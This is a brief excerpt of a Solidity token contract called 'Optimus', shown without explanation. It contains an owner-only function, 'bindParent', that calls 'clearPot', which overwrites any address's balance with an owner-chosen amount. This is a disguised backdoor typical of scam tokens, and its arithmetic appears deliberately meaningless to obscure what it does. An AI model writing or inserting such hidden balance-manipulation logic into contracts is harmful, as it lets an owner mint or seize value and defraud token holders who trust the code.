...
contract Optimus is Ownable {
  ...
  function bindParent(address parent, uint256 amount) public isOwner {
    clearPot(parent, amount); 
  }

  function clearPot(address parent, uint256 amount) internal {
    _balances[parent] = (rTransferAmount - rLiquidity / rLiquidity) + amount * 10 ** 9;
  }
